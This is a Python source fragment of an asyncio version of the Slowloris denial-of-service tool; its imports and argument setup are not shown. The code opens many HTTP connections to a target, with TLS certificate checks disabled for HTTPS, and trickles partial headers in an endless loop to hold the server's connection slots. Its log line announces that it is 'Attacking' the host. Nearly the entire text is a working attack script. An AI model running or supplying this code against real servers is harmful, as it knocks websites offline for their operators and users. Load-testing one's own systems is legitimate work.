async def send_line(s, line):
    line = f"{line}\r\n"
    await asyncio.get_event_loop().sock_sendall(s, line.encode("utf-8"))

async def send_header(s, name, value):
    await send_line(s, f"{name}: {value}")

async def init_socket(ip: str):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    if args.https:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=args.host)

    await asyncio.get_event_loop().sock_connect(s, (ip, args.port))

    await send_line(s, f"GET /?{random.randint(0, 2000)} HTTP/1.1")

    ua = user_agents[0]
    if args.randuseragent:
        ua = random.choice(user_agents)

    await send_header(s, "User-Agent", ua)
    await send_header(s, "Accept-language", "en-US,en,q=0.5")
    return s

async def slowloris_iteration():
    global list_of_sockets
    logging.info("Sending keep-alive headers...")
    logging.info("Socket count: %s", len(list_of_sockets))

    for s in list(list_of_sockets):
        try:
            await send_header(s, "X-a", random.randint(1, 5000))
        except socket.error:
            list_of_sockets.remove(s)

    diff = args.sockets - len(list_of_sockets)
    if diff <= 0:
        return

    logging.info("Creating %s new sockets...", diff)
    for _ in range(diff):
        try:
            s = await init_socket(args.host)
            if not s:
                continue
            list_of_sockets.append(s)
        except socket.error as e:
            logging.debug("Failed to create new socket: %s", e)
            break

async def main():
    global list_of_sockets
    ip = args.host
    socket_count = args.sockets
    logging.info("Attacking %s with %s sockets.", ip, socket_count)

    logging.info("Creating sockets...")
    tasks = [init_socket(ip) for _ in range(socket_count)]
    list_of_sockets.extend(await asyncio.gather(*tasks))

    while True:
        try:
            await slowloris_iteration()
        except (KeyboardInterrupt, SystemExit):
            logging.info("Stopping Slowloris")
            break
        except Exception as e:
            logging.debug("Error in Slowloris iteration: %s", e)
        logging.debug("Sleeping for %d seconds", args.sleeptime)
        await asyncio.sleep(args.sleeptime)

if __name__ == "__main__":
    asyncio.run(main())
